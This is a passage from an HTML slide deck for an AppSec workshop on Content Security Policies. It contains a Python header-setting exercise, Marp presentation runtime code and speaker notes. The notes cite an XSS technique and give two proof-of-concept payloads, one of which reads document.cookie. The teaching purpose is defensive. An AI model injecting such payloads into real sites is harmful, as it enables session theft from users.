<li>GitPod: <code>https://gitpod.io/#/https://github.com/Bouvet-deler/csp-workshop/</code></li>
</ul>
<pre is="marp-pre" data-auto-scaling="downscale-only"><code class="language-python">    <span class="hljs-comment">#Set your HTTP Response headers below</span>
    <span class="hljs-comment">#response.headers[&#x27;&lt;header&gt;&#x27;] = &quot;&lt;header_value(s)&gt;&quot;</span>
    csp_policy = <span class="hljs-string">&quot;default-src &#x27;none&#x27;;&quot;</span>
    script_policy = <span class="hljs-string">&quot; script-src &#x27;none&#x27;;&quot;</span>
    style_policy = <span class="hljs-string">&quot; style-src &#x27;none&#x27;;&quot;</span>
    font_policy = <span class="hljs-string">&quot; font-src &#x27;none&#x27;;&quot;</span>
    img_policy = <span class="hljs-string">&quot; img-src &#x27;none&#x27;;&quot;</span>
    response.headers[<span class="hljs-string">&#x27;Content-Security-Policy-Report-Only&#x27;</span>] = csp_policy
</code></pre>
<footer>AppSec Workshop - Content Security Policies</footer>
</section>
<script>!function(){"use strict";const t={h1:{proto:()=>HTMLHeadingElement,attrs:{role:"heading","aria-level":"1"},style:"display: block; font-size: 2em; margin-block-start: 0.67em; margin-block-end: 0.67em; margin-inline-start: 0px; margin-inline-end: 0px; font-weight: bold;"},h2:{proto:()=>HTMLHeadingElement,attrs:{role:"heading","aria-level":"2"},style:"display: block; font-size: 1.5em; margin-block-start: 0.83em; margin-block-end: 0.83em; margin-inline-start: 0px; margin-inline-end: 0px; font-weight: bold;"},h3:{proto:()=>HTMLHeadingElement,attrs:{role:"heading","aria-level":"3"},style:"display: block; font-size: 1.17em; margin-block-start: 1em; margin-block-end: 1em; margin-inline-start: 0px; margin-inline-end: 0px; font-weight: bold;"},h4:{proto:()=>HTMLHeadingElement,attrs:{role:"heading","aria-level":"4"},style:"display: block; margin-block-start: 1.33em; margin-block-end: 1.33em; margin-inline-start: 0px; margin-inline-end: 0px; font-weight: bold;"},h5:{proto:()=>HTMLHeadingElement,attrs:{role:"heading","aria-level":"5"},style:"display: block; font-size: 0.83em; margin-block-start: 1.67em; margin-block-end: 1.67em; margin-inline-start: 0px; margin-inline-end: 0px; font-weight: bold;"},h6:{proto:()=>HTMLHeadingElement,attrs:{role:"heading","aria-level":"6"},style:"display: block; font-size: 0.67em; margin-block-start: 2.33em; margin-block-end: 2.33em; margin-inline-start: 0px; margin-inline-end: 0px; font-weight: bold;"},span:{proto:()=>HTMLSpanElement},pre:{proto:()=>HTMLElement,style:"display: block; font-family: monospace; white-space: pre; margin: 1em 0; --marp-auto-scaling-white-space: pre;"}},e="data-marp-auto-scaling-wrapper",i="data-marp-auto-scaling-svg",n="data-marp-auto-scaling-container";class s extends HTMLElement{constructor(){super(),this.svgPreserveAspectRatio="xMinYMid meet";const t=t=>([e])=>{const{width:i,height:n}=e.contentRect;this[t]={width:i,height:n},this.updateSVGRect()};this.attachShadow({mode:"open"}),this.containerObserver=new ResizeObserver(t("containerSize")),this.wrapperObserver=new ResizeObserver(((...e)=>{t("wrapperSize")(...e),this.flushSvgDisplay()}))}static get observedAttributes(){return["data-downscale-only"]}connectedCallback(){var t,s,o,r,a;this.shadowRoot.innerHTML=`\n<style>\n  svg[${i}] { display: block; width: 100%; height: auto; vertical-align: top; }\n  span[${n}] { display: table; white-space: var(--marp-auto-scaling-white-space, nowrap); width: max-content; }\n</style>\n<div ${e}>\n  <svg part="svg" ${i}>\n    <foreignObject><span ${n}><slot></slot></span></foreignObject>\n  </svg>\n</div>\n    `.split(/\n\s*/).join(""),this.wrapper=null!==(t=this.shadowRoot.querySelector(`div[${e}]`))&&void 0!==t?t:void 0;const l=this.svg;this.svg=null!==(o=null===(s=this.wrapper)||void 0===s?void 0:s.querySelector(`svg[${i}]`))&&void 0!==o?o:void 0,this.svg!==l&&(this.svgComputedStyle=this.svg?window.getComputedStyle(this.svg):void 0),this.container=null!==(a=null===(r=this.svg)||void 0===r?void 0:r.querySelector(`span[${n}]`))&&void 0!==a?a:void 0,this.observe()}disconnectedCallback(){this.svg=void 0,this.svgComputedStyle=void 0,this.wrapper=void 0,this.container=void 0,this.observe()}attributeChangedCallback(){this.observe()}flushSvgDisplay(){const{svg:t}=this;t&&(t.style.display="inline",requestAnimationFrame((()=>{t.style.display=""})))}observe(){this.containerObserver.disconnect(),this.wrapperObserver.disconnect(),this.wrapper&&this.wrapperObserver.observe(this.wrapper),this.container&&this.containerObserver.observe(this.container),this.svgComputedStyle&&this.observeSVGStyle(this.svgComputedStyle)}observeSVGStyle(t){const e=()=>{const i=(()=>{const e=t.getPropertyValue("--preserve-aspect-ratio");if(e)return e.trim();return`x${(({textAlign:t,direction:e})=>{if(t.endsWith("left"))return"Min";if(t.endsWith("right"))return"Max";if("start"===t||"end"===t){let i="rtl"===e;return"end"===t&&(i=!i),i?"Max":"Min"}return"Mid"})(t)}YMid meet`})();i!==this.svgPreserveAspectRatio&&(this.svgPreserveAspectRatio=i,this.updateSVGRect()),t===this.svgComputedStyle&&requestAnimationFrame(e)};e()}updateSVGRect(){var t,e,i,n,s,o,r;let a=Math.ceil(null!==(e=null===(t=this.containerSize)||void 0===t?void 0:t.width)&&void 0!==e?e:0);const l=Math.ceil(null!==(n=null===(i=this.containerSize)||void 0===i?void 0:i.height)&&void 0!==n?n:0);void 0!==this.dataset.downscaleOnly&&(a=Math.max(a,null!==(o=null===(s=this.wrapperSize)||void 0===s?void 0:s.width)&&void 0!==o?o:0));const c=null===(r=this.svg)||void 0===r?void 0:r.querySelector(":scope > foreignObject");if(null==c||c.setAttribute("width",`${a}`),null==c||c.setAttribute("height",`${l}`),this.svg&&(this.svg.setAttribute("viewBox",`0 0 ${a} ${l}`),this.svg.setAttribute("preserveAspectRatio",this.svgPreserveAspectRatio),this.svg.style.height=a<=0||l<=0?"0":""),this.container){const t=this.svgPreserveAspectRatio.toLowerCase();this.container.style.marginLeft=t.startsWith("xmid")||t.startsWith("xmax")?"auto":"0",this.container.style.marginRight=t.startsWith("xmi")?"auto":"0"}}}const o=(t,{attrs:e={},style:i})=>class extends t{constructor(...t){super(...t);for(const[t,i]of Object.entries(e))this.hasAttribute(t)||this.setAttribute(t,i);this.attachShadow({mode:"open"})}static get observedAttributes(){return["data-auto-scaling"]}connectedCallback(){this._update()}attributeChangedCallback(){this._update()}_update(){const t=i?`<style>:host { ${i} }</style>`:"";let e="<slot></slot>";const{autoScaling:n}=this.dataset;if(void 0!==n){e=`<marp-auto-scaling exportparts="svg:auto-scaling" ${"downscale-only"===n?"data-downscale-only":""}>${e}</marp-auto-scaling>`}this.shadowRoot.innerHTML=t+e}};let r;const a=Symbol();let l;const c="marpitSVGPolyfill:setZoomFactor,",d=Symbol(),g=Symbol();const h=()=>{const t="Apple Computer, Inc."===navigator.vendor,e=t?[u]:[],i={then:e=>(t?(async()=>{if(void 0===l){const t=document.createElement("canvas");t.width=10,t.height=10;const e=t.getContext("2d"),i=new Image(10,10),n=new Promise((t=>{i.addEventListener("load",(()=>t()))}));i.crossOrigin="anonymous",i.src="data:image/svg+xml;charset=utf8,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2210%22%20height%3D%2210%22%20viewBox%3D%220%200%201%201%22%3E%3CforeignObject%20width%3D%221%22%20height%3D%221%22%20requiredExtensions%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxhtml%22%3E%3Cdiv%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxhtml%22%20style%3D%22width%3A%201px%3B%20height%3A%201px%3B%20background%3A%20red%3B%20position%3A%20relative%22%3E%3C%2Fdiv%3E%3C%2FforeignObject%3E%3C%2Fsvg%3E",await n,e.drawImage(i,0,0),l=e.getImageData(5,5,1,1).data[3]<128}return l})().then((t=>{null==e||e(t?[u]:[])})):null==e||e([]),i)};return Object.assign(e,i)};let p,m;function u(t){const e="object"==typeof t&&t.target||document,i="object"==typeof t?t.zoom:t;window[g]||(Object.defineProperty(window,g,{configurable:!0,value:!0}),document.body.style.zoom=1.0001,document.body.offsetHeight,document.body.style.zoom=1,window.addEventListener("message",(({data:t,origin:e})=>{if(e===window.origin)try{if(t&&"string"==typeof t&&t.startsWith(c)){const[,e]=t.split(","),i=Number.parseFloat(e);Number.isNaN(i)||(m=i)}}catch(t){console.error(t)}})));let n=!1;Array.from(e.querySelectorAll("svg[data-marpit-svg]"),(t=>{var e,s,o,r;t.style.transform||(t.style.transform="translateZ(0)");const a=i||m||t.currentScale||1;p!==a&&(p=a,n=a);const l=t.getBoundingClientRect(),{length:c}=t.children;for(let i=0;i<c;i+=1){const n=t.children[i];if(n.getScreenCTM){const t=n.getScreenCTM();if(t){const i=null!==(s=null===(e=n.x)||void 0===e?void 0:e.baseVal.value)&&void 0!==s?s:0,c=null!==(r=null===(o=n.y)||void 0===o?void 0:o.baseVal.value)&&void 0!==r?r:0,d=n.children.length;for(let e=0;e<d;e+=1){const s=n.children[e];if("SECTION"===s.tagName){const{style:e}=s;e.transformOrigin||(e.transformOrigin=`${-i}px ${-c}px`),e.transform=`scale(${a}) matrix(${t.a}, ${t.b}, ${t.c}, ${t.d}, ${t.e-l.left}, ${t.f-l.top}) translateZ(0.0001px)`;break}}}}}})),!1!==n&&Array.from(e.querySelectorAll("iframe"),(({contentWindow:t})=>{null==t||t.postMessage(`${c}${n}`,"null"===window.origin?"*":window.origin)}))}function v({once:t=!1,target:e=document}={}){const i=function(t=document){if(t[d])return t[d];let e=!0;const i=()=>{e=!1,delete t[d]};Object.defineProperty(t,d,{configurable:!0,value:i});let n=[],s=!1;(async()=>{try{n=await h()}finally{s=!0}})();const o=()=>{for(const e of n)e({target:t});s&&0===n.length||e&&window.requestAnimationFrame(o)};return o(),i}(e);return t?(i(),()=>{}):i}p=1,m=void 0;const b=Symbol(),w=(e=document)=>{if("undefined"==typeof window)throw new Error("Marp Core's browser script is valid only in browser context.");if(((e=document)=>{const i=window[a];i||customElements.define("marp-auto-scaling",s);for(const n of Object.keys(t)){const s=`marp-${n}`,a=t[n].proto();null!=r||(r=!!document.createElement("div",{is:"marp-auto-scaling"}).outerHTML.startsWith("<div is")),r&&a!==HTMLElement?i||customElements.define(s,o(a,{style:t[n].style}),{extends:n}):(i||customElements.define(s,o(HTMLElement,t[n])),e.querySelectorAll(`${n}[is="${s}"]`).forEach((t=>{t.outerHTML=t.outerHTML.replace(new RegExp(`^<${n}`,"i"),`<${s}`).replace(new RegExp(`</${n}>$`,"i"),`</${s}>`)})))}window[a]=!0})(e),e[b])return e[b];const i=v({target:e}),n=()=>{i(),delete e[b]},l=Object.assign(n,{cleanup:n,update:()=>w(e)});return Object.defineProperty(e,b,{configurable:!0,value:l}),l},y=document.currentScript;w(y?y.getRootNode():document)}();
</script></foreignObject></svg></div><div class="bespoke-marp-note" data-index="7" tabindex="0"><p>source: https://inventropy.us/blog/constructing-an-xss-vector-using-no-letters</p></div><div class="bespoke-marp-note" data-index="8" tabindex="0"><p># Function(&quot;alert(1)&quot;)();</p><p># Function(&quot;alert(document.cookie)&quot;)();</p></div><script>/*!! License: https://unpkg.com/@marp-team/marp-cli@3.3.1/lib/bespoke.js.LICENSE.txt */
!function(){"use strict";function e(e){return e&&e.__esModule&&Object.prototype.hasOwnProperty.call(e,"default")?e.default:e}var t={from:function(e,t){var n,r=1===(e.parent||e).nodeType?e.parent||e:document.querySelector(e.parent||e),o=[].filter.call("string"==typeof e.slides?r.querySelectorAll(e.slides):e.slides||r.children,(function(e){return"SCRIPT"!==e.nodeName})),i={},a=function(e,t){return(t=t||{}).index=o.indexOf(e),t.slide=e,t},s=function(e,t){i[e]=(i[e]||[]).filter((function(e){return e!==t}))},l=function(e,t){return(i[e]||[]).reduce((function(e,n){return e&&!1!==n(t)}),!0)},c=function(e,t){o[e]&&(n&&l("deactivate",a(n,t)),n=o[e],l("activate",a(n,t)))},d=function(e,t){var r=o.indexOf(n)+e;l(e>0?"next":"prev",a(n,t))&&c(r,t)},u={off:s,on:function(e,t){return(i[e]||(i[e]=[])).push(t),s.bind(null,e,t)},fire:l,slide:function(e,t){if(!arguments.length)return o.indexOf(n);l("slide",a(o[e],t))&&c(e,t)},next:d.bind(null,1),prev:d.bind(null,-1),parent:r,slides:o,destroy:function(e){l("destroy",a(n,e)),i={}}};return(t||[]).forEach((function(e){e(u)})),n||c(0),u}},n=e(t);const r=document.body,o=(...e)=>history.replaceState(...e),i="presenter",a="next",s=["",i,a],l="bespoke-marp-",c=`data-${l}`,d=(e,{protocol:t,host:n,pathname:r,hash:o}=location)=>{const i=e.toString();return`${t}//${n}${r}${i?"?":""}${i}${o}`},u=()=>r.dataset.bespokeView,f=e=>new URLSearchParams(location.search).get(e),m=(e,t={})=>{var n;const r={location,setter:o,...t},i=new URLSearchParams(r.location.search);for(const t of Object.keys(e)){const n=e[t];"string"==typeof n?i.set(t,n):i.delete(t)}try{r.setter({...null!==(n=window.history.state)&&void 0!==n?n:{}},"",d(i,r.location))}catch(e){console.error(e)}},g=(()=>{const e="bespoke-marp";try{return localStorage.setItem(e,e),localStorage.removeItem(e),!0}catch(e){return!1}})(),p=e=>{try{return localStorage.getItem(e)}catch(e){return null}},v=(e,t)=>{try{return localStorage.setItem(e,t),!0}catch(e){return!1}},h=e=>{try{return localStorage.removeItem(e),!0}catch(e){return!1}},y=(e,t)=>{const n="aria-hidden";t?e.setAttribute(n,"true"):e.removeAttribute(n)},b=e=>{e.parent.classList.add(`${l}parent`),e.slides.forEach((e=>e.classList.add(`${l}slide`))),e.on("activate",(t=>{const n=`${l}active`,r=t.slide,o=r.classList,i=!o.contains(n);if(e.slides.forEach((e=>{e.classList.remove(n),y(e,!0)})),o.add(n),y(r,!1),i){const e=`${n}-ready`;o.add(e),document.body.clientHeight,o.remove(e)}}))},w=e=>{let t=0,n=0;Object.defineProperty(e,"fragments",{enumerable:!0,value:e.slides.map((e=>[null,...e.querySelectorAll("[data-marpit-fragment]")]))});const r=r=>void 0!==e.fragments[t][n+r],o=(r,o)=>{t=r,n=o,e.fragments.forEach(((e,t)=>{e.forEach(((e,n)=>{if(null==e)return;const i=t<r||t===r&&n<=o;e.setAttribute(`${c}fragment`,(i?"":"in")+"active");const a=`${c}current-fragment`;t===r&&n===o?e.setAttribute(a,"current"):e.removeAttribute(a)}))})),e.fragmentIndex=o;const i={slide:e.slides[r],index:r,fragments:e.fragments[r],fragmentIndex:o};e.fire("fragment",i)};e.on("next",(({fragment:i=!0})=>{if(i){if(r(1))return o(t,n+1),!1;const i=t+1;e.fragments[i]&&o(i,0)}else{const r=e.fragments[t].length;if(n+1<r)return o(t,r-1),!1;const i=e.fragments[t+1];i&&o(t+1,i.length-1)}})),e.on("prev",(({fragment:i=!0})=>{if(r(-1)&&i)return o(t,n-1),!1;const a=t-1;e.fragments[a]&&o(a,e.fragments[a].length-1)})),e.on("slide",(({index:t,fragment:n})=>{let r=0;if(void 0!==n){const o=e.fragments[t];if(o){const{length:e}=o;r=-1===n?e-1:Math.min(Math.max(n,0),e-1)}}o(t,r)})),o(0,0)},x=document,k=()=>!(!x.fullscreenEnabled&&!x.webkitFullscreenEnabled),$=()=>!(!x.fullscreenElement&&!x.webkitFullscreenElement),E=e=>{e.fullscreen=()=>{k()&&(async()=>{return $()?null===(e=x.exitFullscreen||x.webkitExitFullscreen)||void 0===e?void 0:e.call(x):((e=x.body)=>{var t;return null===(t=e.requestFullscreen||e.webkitRequestFullscreen)||void 0===t?void 0:t.call(e)})();var e})()},document.addEventListener("keydown",(t=>{"f"!==t.key&&"F11"!==t.key||t.altKey||t.ctrlKey||t.metaKey||!k()||(e.fullscreen(),t.preventDefault())}))},L=`${l}inactive`,S=(e=2e3)=>({parent:t,fire:n})=>{const r=t.classList,o=e=>n(`marp-${e?"":"in"}active`);let i;const a=()=>{i&&clearTimeout(i),i=setTimeout((()=>{r.add(L),o()}),e),r.contains(L)&&(r.remove(L),o(!0))};for(const e of["mousedown","mousemove","touchend"])document.addEventListener(e,a);setTimeout(a,0)},P=["AUDIO","BUTTON","INPUT","SELECT","TEXTAREA","VIDEO"],_=e=>{e.parent.addEventListener("keydown",(e=>{if(!e.target)return;const t=e.target;(P.includes(t.nodeName)||"true"===t.contentEditable)&&e.stopPropagation()}))},T=e=>{window.addEventListener("load",(()=>{for(const t of e.slides){const e=t.querySelector("marp-auto-scaling, [data-auto-scaling], [data-marp-fitting]");t.setAttribute(`${c}load`,e?"":"hideable")}}))},I=({interval:e=250}={})=>t=>{document.addEventListener("keydown",(e=>{if(" "===e.key&&e.shiftKey)t.prev();else if("ArrowLeft"===e.key||"ArrowUp"===e.key||"PageUp"===e.key)t.prev({fragment:!e.shiftKey});else if(" "!==e.key||e.shiftKey)if("ArrowRight"===e.key||"ArrowDown"===e.key||"PageDown"===e.key)t.next({fragment:!e.shiftKey});else if("End"===e.key)t.slide(t.slides.length-1,{fragment:-1});else{if("Home"!==e.key)return;t.slide(0)}else t.next();e.preventDefault()}));let n,r,o=0;t.parent.addEventListener("wheel",(i=>{let a=!1;const s=(e,t)=>{e&&(a=a||((e,t)=>((e,t)=>{const n="X"===t?"Width":"Height";return e[`client${n}`]<e[`scroll${n}`]})(e,t)&&((e,t)=>{const{overflow:n}=e,r=e[`overflow${t}`];return"auto"===n||"scroll"===n||"auto"===r||"scroll"===r})(getComputedStyle(e),t))(e,t)),(null==e?void 0:e.parentElement)&&s(e.parentElement,t)};if(0!==i.deltaX&&s(i.target,"X"),0!==i.deltaY&&s(i.target,"Y"),a)return;i.preventDefault();const l=Math.sqrt(i.deltaX**2+i.deltaY**2);if(void 0!==i.wheelDelta){if(void 0===i.webkitForce&&Math.abs(i.wheelDelta)<40)return;if(i.deltaMode===i.DOM_DELTA_PIXEL&&l<4)return}else if(i.deltaMode===i.DOM_DELTA_PIXEL&&l<12)return;r&&clearTimeout(r),r=setTimeout((()=>{n=0}),e);const c=Date.now()-o<e,d=l<=n;if(n=l,c||d)return;let u;(i.deltaX>0||i.deltaY>0)&&(u="next"),(i.deltaX<0||i.deltaY<0)&&(u="prev"),u&&(t[u](),o=Date.now())}))},M=(e=`.${l}osc`)=>{const t=document.querySelector(e);if(!t)return()=>{};const n=(e,n)=>{t.querySelectorAll(`[${c}osc=${JSON.stringify(e)}]`).forEach(n)};return k()||n("fullscreen",(e=>e.style.display="none")),g||n("presenter",(e=>{e.disabled=!0,e.title="Presenter view is disabled due to restricted localStorage."})),e=>{t.addEventListener("click",(t=>{if(t.target instanceof HTMLElement){const{bespokeMarpOsc:n}=t.target.dataset;n&&t.target.blur();const r={fragment:!t.shiftKey};"next"===n?e.next(r):"prev"===n?e.prev(r):"fullscreen"===n?null==e||e.fullscreen():"presenter"===n&&e.openPresenterView()}})),e.parent.appendChild(t),e.on("activate",(({index:t})=>{n("page",(n=>n.textContent=`Page ${t+1} of ${e.slides.length}`))})),e.on("fragment",(({index:t,fragments:r,fragmentIndex:o})=>{n("prev",(e=>e.disabled=0===t&&0===o)),n("next",(n=>n.disabled=t===e.slides.length-1&&o===r.length-1))})),e.on("marp-active",(()=>y(t,!1))),e.on("marp-inactive",(()=>y(t,!0))),k()&&(e=>{for(const t of["","webkit"])x.addEventListener(t+"fullscreenchange",e)})((()=>n("fullscreen",(e=>e.classList.toggle("exit",k()&&$())))))}},O=e=>{window.addEventListener("message",(t=>{if(t.origin!==window.origin)return;const[n,r]=t.data.split(":");if("navigate"===n){const[t,n]=r.split(",");let o=Number.parseInt(t,10),i=Number.parseInt(n,10)+1;i>=e.fragments[o].length&&(o+=1,i=0),e.slide(o,{fragment:i})}}))};var A=["area","base","br","col","command","embed","hr","img","input","keygen","link","meta","param","source","track","wbr"];let C=e=>String(e).replace(/[&<>"']/g,(e=>`&${D[e]};`)),D={"&":"amp","<":"lt",">":"gt",'"':"quot","'":"apos"},N="dangerouslySetInnerHTML",B={className:"class",htmlFor:"for"},q={};function K(e,t){let n=[],r="";t=t||{};for(let e=arguments.length;e-- >2;)n.push(arguments[e]);if("function"==typeof e)return t.children=n.reverse(),e(t);if(e){if(r+="<"+e,t)for(let e in t)!1!==t[e]&&null!=t[e]&&e!==N&&(r+=` ${B[e]?B[e]:C(e)}="${C(t[e])}"`);r+=">"}if(-1===A.indexOf(e)){if(t[N])r+=t[N].__html;else for(;n.length;){let e=n.pop();if(e)if(e.pop)for(let t=e.length;t--;)n.push(e[t]);else r+=!0===q[e]?e:C(e)}r+=e?`</${e}>`:""}return q[r]=!0,r}const j=({children:e})=>K(null,null,...e),F=`${l}presenter-`,V={container:`${F}container`,dragbar:`${F}dragbar-container`,next:`${F}next`,nextContainer:`${F}next-container`,noteContainer:`${F}note-container`,noteWrapper:`${F}note-wrapper`,noteButtons:`${F}note-buttons`,infoContainer:`${F}info-container`,infoPage:`${F}info-page`,infoPageText:`${F}info-page-text`,infoPagePrev:`${F}info-page-prev`,infoPageNext:`${F}info-page-next`,noteButtonsBigger:`${F}note-bigger`,noteButtonsSmaller:`${F}note-smaller`,infoTime:`${F}info-time`,infoTimer:`${F}info-timer`},U=e=>{const{title:t}=document;document.title="[Presenter view]"+(t?` - ${t}`:"");const n={},r=e=>(n[e]=n[e]||document.querySelector(`.${e}`),n[e]);document.body.appendChild((e=>{const t=document.createElement("div");return t.className=V.container,t.appendChild(e),t.insertAdjacentHTML("beforeend",K(j,null,K("div",{class:V.nextContainer},K("iframe",{class:V.next,src:"?view=next"})),K("div",{class:V.dragbar}),K("div",{class:V.noteContainer},K("div",{class:V.noteWrapper}),K("div",{class:V.noteButtons},K("button",{class:V.noteButtonsSmaller,tabindex:"-1",title:"Smaller notes font size"},"Smaller notes font size"),K("button",{class:V.noteButtonsBigger,tabindex:"-1",title:"Bigger notes font size"},"Bigger notes font size"))),K("div",{class:V.infoContainer},K("div",{class:V.infoPage},K("button",{class:V.infoPagePrev,tabindex:"-1",title:"Previous"},"Previous"),K("span",{class:V.infoPageText}),K("button",{class:V.infoPageNext,tabindex:"-1",title:"Next"},"Next")),K("time",{class:V.infoTime,title:"Current time"}),K("time",{class:V.infoTimer,title:"Timer"})))),t})(e.parent)),(e=>{let t=!1;r(V.dragbar).addEventListener("mousedown",(()=>{t=!0,r(V.dragbar).classList.add("active")})),window.addEventListener("mouseup",(()=>{t=!1,r(V.dragbar).classList.remove("active")})),window.addEventListener("mousemove",(e=>{if(!t)return;const n=e.clientX/document.documentElement.clientWidth*100;r(V.container).style.setProperty("--bespoke-marp-presenter-split-ratio",`${Math.max(0,Math.min(100,n))}%`)})),r(V.nextContainer).addEventListener("click",(()=>e.next()));const n=r(V.next),o=(i=n,(e,t)=>{var n;return null===(n=i.contentWindow)||void 0===n?void 0:n.postMessage(`navigate:${e},${t}`,"null"===window.origin?"*":window.origin)});var i;n.addEventListener("load",(()=>{r(V.nextContainer).classList.add("active"),o(e.slide(),e.fragmentIndex),e.on("fragment",(({index:e,fragmentIndex:t})=>o(e,t)))}));const a=document.querySelectorAll(".bespoke-marp-note");a.forEach((e=>{e.addEventListener("keydown",(e=>e.stopPropagation())),r(V.noteWrapper).appendChild(e)})),e.on("activate",(()=>a.forEach((t=>t.classList.toggle("active",t.dataset.index==e.slide())))));let s=0;const l=e=>{s=Math.max(-5,s+e),r(V.noteContainer).style.setProperty("--bespoke-marp-note-font-scale",(1.2**s).toFixed(4))},c=()=>l(1),d=()=>l(-1),u=r(V.noteButtonsBigger),f=r(V.noteButtonsSmaller);u.addEventListener("click",(()=>{u.blur(),c()})),f.addEventListener("click",(()=>{f.blur(),d()})),document.addEventListener("keydown",(e=>{"+"===e.key&&c(),"-"===e.key&&d()}),!0),e.on("activate",(({index:t})=>{r(V.infoPageText).textContent=`${t+1} / ${e.slides.length}`}));const m=r(V.infoPagePrev),g=r(V.infoPageNext);m.addEventListener("click",(t=>{m.blur(),e.prev({fragment:!t.shiftKey})})),g.addEventListener("click",(t=>{g.blur(),e.next({fragment:!t.shiftKey})})),e.on("fragment",(({index:t,fragments:n,fragmentIndex:r})=>{m.disabled=0===t&&0===r,g.disabled=t===e.slides.length-1&&r===n.length-1}));let p=new Date;const v=()=>{const e=new Date,t=e=>`${Math.floor(e)}`.padStart(2,"0"),n=e.getTime()-p.getTime(),o=t(n/1e3%60),i=t(n/1e3/60%60),a=t(n/36e5%24);r(V.infoTime).textContent=e.toLocaleTimeString(),r(V.infoTimer).textContent=`${a}:${i}:${o}`};v(),setInterval(v,250),r(V.infoTimer).addEventListener("click",(()=>{p=new Date}))})(e)},X=e=>{if(!(e=>e.syncKey&&"string"==typeof e.syncKey)(e))throw new Error("The current instance of Bespoke.js is invalid for Marp bespoke presenter plugin.");Object.defineProperties(e,{openPresenterView:{enumerable:!0,value:H},presenterUrl:{enumerable:!0,get:R}}),g&&document.addEventListener("keydown",(t=>{"p"!==t.key||t.altKey||t.ctrlKey||t.metaKey||(t.preventDefault(),e.openPresenterView())}))};function H(){const{max:e,floor:t}=Math,n=e(t(.85*window.innerWidth),640),r=e(t(.85*window.innerHeight),360);return window.open(this.presenterUrl,F+this.syncKey,`width=${n},height=${r},menubar=no,toolbar=no`)}function R(){const e=new URLSearchParams(location.search);return e.set("view","presenter"),e.set("sync",this.syncKey),d(e)}const W=e=>{const t=u();return t===a&&e.appendChild(document.createElement("span")),{"":X,[i]:U,[a]:O}[t]},J=e=>{e.on("activate",(t=>{document.querySelectorAll(".bespoke-progress-parent > .bespoke-progress-bar").forEach((n=>{n.style.flexBasis=100*t.index/(e.slides.length-1)+"%"}))}))},Y=e=>{const t=Number.parseInt(e,10);return Number.isNaN(t)?null:t},z=(e={})=>{const t={history:!0,...e};return e=>{let n=!0;const r=e=>{const t=n;try{return n=!0,e()}finally{n=t}},o=(t={fragment:!0})=>{let n=t.fragment?Y(f("f")||""):null;((t,n)=>{const{min:r,max:o}=Math,{fragments:i,slides:a}=e,s=o(0,r(t,a.length-1)),l=o(0,r(n||0,i[s].length-1));s===e.slide()&&l===e.fragmentIndex||e.slide(s,{fragment:l})})((()=>{var t,r;if(location.hash){const[o]=location.hash.slice(1).split(":~:");if(/^\d+$/.test(o))return(null!==(t=Y(o))&&void 0!==t?t:1)-1;const i=document.getElementById(o)||document.querySelector(`a[name="${CSS.escape(o)}"]`);if(i){const{length:t}=e.slides;for(let o=0;o<t;o+=1)if(e.slides[o].contains(i)){const t=null===(r=e.fragments)||void 0===r?void 0:r[o],a=i.closest("[data-marpit-fragment]");if(t&&a){const e=t.indexOf(a);e>=0&&(n=e)}return o}}}return 0})(),n)};e.on("fragment",(({index:e,fragmentIndex:r})=>{n||m({f:0===r||r.toString()},{location:{...location,hash:`#${e+1}`},setter:(...e)=>t.history?history.pushState(...e):history.replaceState(...e)})})),setTimeout((()=>{o(),window.addEventListener("hashchange",(()=>r((()=>{o({fragment:!1}),m({f:void 0})})))),window.addEventListener("popstate",(()=>{n||r((()=>o()))})),n=!1}),0)}},G=(e={})=>{var t;const n=e.key||(null===(t=window.history.state)||void 0===t?void 0:t.marpBespokeSyncKey)||Math.random().toString(36).slice(2),r=`bespoke-marp-sync-${n}`;var i;i={marpBespokeSyncKey:n},m({},{setter:(e,...t)=>o({...e,...i},...t)});const a=()=>{const e=p(r);return e?JSON.parse(e):Object.create(null)},s=e=>{const t=a(),n={...t,...e(t)};return v(r,JSON.stringify(n)),n},l=()=>{window.removeEventListener("pageshow",l),s((e=>({reference:(e.reference||0)+1})))};return e=>{l(),Object.defineProperty(e,"syncKey",{value:n,enumerable:!0});let t=!0;setTimeout((()=>{e.on("fragment",(e=>{t&&s((()=>({index:e.index,fragmentIndex:e.fragmentIndex})))}))}),0),window.addEventListener("storage",(n=>{if(n.key===r&&n.oldValue&&n.newValue){const r=JSON.parse(n.oldValue),o=JSON.parse(n.newValue);if(r.index!==o.index||r.fragmentIndex!==o.fragmentIndex)try{t=!1,e.slide(o.index,{fragment:o.fragmentIndex,forSync:!0})}finally{t=!0}}}));const o=()=>{const{reference:e}=a();void 0===e||e<=1?h(r):s((()=>({reference:e-1})))};window.addEventListener("pagehide",(e=>{e.persisted&&window.addEventListener("pageshow",l),o()})),e.on("destroy",o)}},{PI:Q,abs:Z,sqrt:ee,atan2:te}=Math,ne={passive:!0},re=({slope:e=-.7,swipeThreshold:t=30}={})=>n=>{let r;const o=n.parent,i=e=>{const t=o.getBoundingClientRect();return{x:e.pageX-(t.left+t.right)/2,y:e.pageY-(t.top+t.bottom)/2}};o.addEventListener("touchstart",(({touches:e})=>{r=1===e.length?i(e[0]):void 0}),ne),o.addEventListener("touchmove",(e=>{if(r)if(1===e.touches.length){e.preventDefault();const t=i(e.touches[0]),n=t.x-r.x,o=t.y-r.y;r.delta=ee(Z(n)**2+Z(o)**2),r.radian=te(n,o)}else r=void 0})),o.addEventListener("touchend",(o=>{if(r){if(r.delta&&r.delta>=t&&r.radian){const t=(r.radian-e+Q)%(2*Q)-Q;n[t<0?"next":"prev"](),o.stopPropagation()}r=void 0}}),ne)},oe=new Map;oe.clear(),oe.set("none",{backward:{both:void 0,incoming:void 0,outgoing:void 0},forward:{both:void 0,incoming:void 0,outgoing:void 0}});const ie={both:"",outgoing:"outgoing-",incoming:"incoming-"},ae={forward:"",backward:"-backward"},se=e=>`--marp-bespoke-transition-animation-${e}`,le=e=>`--marp-transition-${e}`,ce=se("name"),de=se("duration"),ue=e=>new Promise((t=>{const n={},r=document.createElement("div"),o=e=>{r.remove(),t(e)};r.addEventListener("animationstart",(()=>o(n))),Object.assign(r.style,{animationName:e,animationDuration:"1s",animationFillMode:"both",animationPlayState:"paused",position:"absolute",pointerEvents:"none"}),document.body.appendChild(r);const 